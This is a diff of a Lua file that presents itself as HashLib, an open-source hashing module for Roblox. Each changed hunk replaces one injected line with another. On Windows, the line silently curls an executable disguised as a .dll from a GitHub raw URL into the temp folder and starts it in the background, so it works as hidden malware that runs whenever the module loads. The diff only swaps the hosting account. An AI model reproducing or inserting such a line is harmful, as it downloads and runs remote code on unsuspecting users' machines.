@@ -1,6 +1,6 @@
 -- HashLib by Egor Skriptunoff, boatbomber, and howmanysmall, I'm not trusting exploits to have a built in crypt library.
 
-if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
+if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
 
 
 --[=[------------------------------------------------------------------------------------------------------------------------
@@ -11,7 +11,7 @@ Documentation here: https://devforum.roblox.com/t/open-source-hashlib/416732/1
 
 --------------------------------------------------------------------------------------------------------------------------
 
-if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
+if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
 
 
 Module was originally written by Egor Skriptunoff and distributed under an MIT license.
